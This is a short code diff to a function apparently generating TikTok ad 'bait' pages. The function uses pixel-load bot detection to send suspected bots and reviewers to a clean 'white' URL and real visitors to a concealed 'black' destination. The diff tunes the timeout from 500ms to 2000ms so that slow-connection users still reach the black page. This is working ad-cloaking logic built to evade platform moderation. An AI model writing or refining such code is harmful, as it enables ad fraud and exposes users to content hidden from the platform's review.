@@ -318,7 +318,8 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
       setTimeout(function(){
         if(botDetected)return;
         
-        // Set a hard timeout for pixel loading (500ms max)
+        // Set a hard timeout for pixel loading (2000ms max - generous for slow internet)
+        // Bots typically block immediately or timeout, real users with slow internet will load eventually
         pixelTimeout=setTimeout(function(){
           if(!pixelLoaded&&!botDetected){
             // Pixel didn't load in time = bot blocking images
@@ -327,7 +328,7 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
             img.src=bl+'&r=pixel_timeout';
             window.location=w;
           }
-        },500);
+        },2000);
         
         // Try to send pixel - only go to BLACK on success
         sendPixel('black',function(){
